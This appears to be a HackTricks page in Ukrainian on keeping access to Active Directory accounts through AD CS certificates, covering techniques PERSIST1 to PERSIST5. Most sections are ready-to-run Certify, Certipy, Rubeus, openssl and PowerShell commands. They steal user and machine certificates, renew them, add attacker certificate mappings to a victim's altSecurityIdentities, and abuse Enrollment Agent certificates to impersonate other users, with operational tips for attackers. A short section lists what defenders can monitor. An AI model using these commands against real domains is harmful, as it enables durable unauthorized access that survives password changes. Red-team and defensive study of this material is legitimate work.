# AD CS Утримання доступу облікового запису

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий підсумок розділів про утримання доступу облікових записів з відмінного дослідження з [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Розуміння викрадення облікових даних активного користувача за допомогою сертифікатів – PERSIST1

У сценарії, коли користувач може запитувати сертифікат, що дозволяє аутентифікацію в домені, зловмисник має можливість запитати та вкрасти цей сертифікат, щоб підтримувати персистентність у мережі. За замовчуванням шаблон `User` в Active Directory дозволяє такі запити, хоча іноді він може бути вимкнений.

Використовуючи [Certify](https://github.com/GhostPack/Certify) або [Certipy](https://github.com/ly4k/Certipy), ви можете шукати увімкнені шаблони, що дозволяють автентифікацію клієнта, і потім запросити один:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Сила сертифіката полягає в його здатності автентифікуватися як користувач, якому він належить, незалежно від змін пароля, доки сертифікат залишається дійсним.

Ви можете перетворити PEM у PFX і використати це, щоб отримати TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Примітка: У поєднанні з іншими методиками (див. розділи THEFT), аутентифікація на основі сертифікатів дозволяє зберігати тривалий доступ без звернення до LSASS і навіть із контекстів без підвищених привілеїв.

## Отримання стійкості на рівні машини за допомогою сертифікатів - PERSIST2

Якщо нападник має підвищені привілеї на хості, він може зареєструвати обліковий запис комп'ютера скомпрометованої системи для отримання сертифіката, використовуючи шаблон за замовчуванням `Machine`. Аутентифікація від імені машини дозволяє використовувати S4U2Self для локальних служб і може забезпечити надійну персистентність на хості:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Розширення Persistence шляхом поновлення сертифіката - PERSIST3

Зловживання періодами дії та поновлення шаблонів сертифікатів дозволяє нападникові підтримувати довгостроковий доступ. Якщо ви маєте раніше виданий сертифікат та його приватний ключ, ви можете поновити його до закінчення терміну дії, щоб отримати новий, довготривалий обліковий запис (credential) без залишання додаткових артефактів запиту, прив’язаних до початкового суб’єкта.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Оперативна порада: відстежуйте терміни дії PFX-файлів, що перебувають у розпорядженні атакуючого, і оновлюйте їх заздалегідь. Оновлення також може призвести до того, що оновлені сертифікати включатимуть сучасне SID mapping extension, дозволяючи їм залишатися придатними за жорсткіших правил відображення на DC (див. наступний розділ).

## Встановлення явних відображень сертифікатів (altSecurityIdentities) – PERSIST4

Якщо ви можете записувати в атрибут `altSecurityIdentities` цільового облікового запису, ви можете явно зв'язати керований атакуючим сертифікат із цим обліковим записом. Це зберігається навіть після зміни пароля і, при використанні надійних форматів відображення, залишається працездатним під сучасними правилами примусового відображення на DC.

Загальний процес:

1. Отримайте або випустіть клієнтський сертифікат для аутентифікації, який ви контролюєте (наприклад, зареєструйте шаблон `User` від свого імені).
2. Витягніть сильний ідентифікатор із сертифіката (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Додайте явне відображення в атрибут `altSecurityIdentities` жертви, використовуючи цей ідентифікатор.
4. Аутентифікуйтеся за допомогою вашого сертифіката; DC зіставить його з обліковим записом жертви через явне відображення.

Приклад (PowerShell) з використанням надійного відображення Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Потім автентифікуйтеся за допомогою вашого PFX. Certipy отримає TGT безпосередньо:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Побудова надійних відображень `altSecurityIdentities`

На практиці **Issuer+Serial** та **SKI** відображення — найпростіші сильні формати, які можна побудувати з сертифіката, яким володіє зловмисник. Це має значення після **11 лютого 2025 року**, коли DCs за замовчуванням переходять до **Full Enforcement** і слабкі відображення перестають бути надійними.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Примітки
- Використовуйте лише сильні типи зіставлення: `X509IssuerSerialNumber`, `X509SKI`, або `X509SHA1PublicKey`. Слабкі формати (Subject/Issuer, Subject-only, RFC822 email) застаріли і можуть бути заблоковані політикою DC.
- Це зіставлення працює як для **user**, так і для **computer** об'єктів, тому права на запис у `altSecurityIdentities` облікового запису комп'ютера достатні, щоб зберегти присутність як ця машина.
- Ланцюг сертифікатів має складатися до кореня, якому довіряє DC. Enterprise CAs в NTAuth зазвичай довіряють; деякі середовища також довіряють public CAs.
- Аутентифікація Schannel залишається корисною для persistence навіть коли PKINIT зазнає невдачі через відсутність у DC Smart Card Logon EKU або повернення `KDC_ERR_PADATA_TYPE_NOSUPP`.

Детальніше про слабкі явні зіставлення та шляхи атак див.:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent як Persistence – PERSIST5

Якщо ви отримаєте дійсний Certificate Request Agent/Enrollment Agent сертифікат, ви можете на вимогу випускати нові сертифікати, придатні для входу, від імені users і зберігати agent PFX офлайн як persistence token. Потік зловживання:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revocation of the agent certificate or template permissions is required to evict this persistence.

Оперативні нотатки
- Сучасні версії `Certipy` підтримують як `-on-behalf-of`, так і `-renew`, тому зловмисник, який має Enrollment Agent PFX, може видати і пізніше поновити кінцеві сертифікати без повторного доступу до оригінального цільового облікового запису.
- Якщо PKINIT-based TGT retrieval неможливий, отриманий on-behalf-of сертифікат все одно можна використати для Schannel authentication з `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Впровадження Strong Certificate Mapping Enforcement: вплив на persistence

Microsoft KB5014754 запровадила Strong Certificate Mapping Enforcement на domain controllers. З 11 лютого 2025 року DCs за замовчуванням переходять у Full Enforcement, відкидаючи слабкі/неоднозначні зіставлення. Практичні наслідки:

- Сертифікати до 2022 року, які не містять розширення SID mapping, можуть не пройти імпліцитне зіставлення, коли DCs перебувають у Full Enforcement. Зловмисники можуть зберегти доступ або оновивши сертифікати через AD CS (щоб отримати розширення SID), або створивши сильне явне зіставлення в `altSecurityIdentities` (PERSIST4).
- Явні зіставлення, що використовують сильні формати (Issuer+Serial, SKI, SHA1-PublicKey), продовжують працювати. Слабкі формати (Issuer/Subject, Subject-only, RFC822) можуть бути заблоковані і їх слід уникати для persistence.

Адміністратори повинні моніторити і налаштувати оповіщення для:
- Змін у `altSecurityIdentities` та видачі/оновленнях Enrollment Agent і User certificates.
- CA issuance logs щодо on-behalf-of запитів і незвичних патернів поновлення.

## Посилання

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
